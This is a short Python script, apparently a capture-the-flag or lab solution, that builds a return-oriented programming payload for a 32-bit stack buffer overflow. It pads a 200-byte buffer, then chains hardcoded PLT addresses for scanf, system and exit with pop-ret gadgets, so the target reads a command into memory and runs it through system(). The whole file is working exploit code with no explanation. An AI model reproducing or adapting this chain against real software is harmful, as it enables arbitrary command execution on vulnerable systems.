
plt_system = "\x40\x83\x04\x08"
plt_exit = "\x50\x83\x04\x08"
plt_scanf = "\x70\x83\x04\x08"

arg_bufaddr = "\x28\xa0\x04\x08" 
arg_fmstr = "\x50\x85\x04\x08"

arg_status = "\x01\x00\x00\x00"

gaddr_ppr = "\x2a\x85\x04\x08"
gaddr_pr = "\x46\x85\x04\x08"

ex = "A"*200 + "B"*4 + plt_scanf + gaddr_ppr + arg_fmstr + arg_bufaddr + plt_system + gaddr_pr + arg_bufaddr + plt_exit + arg_status


print ex



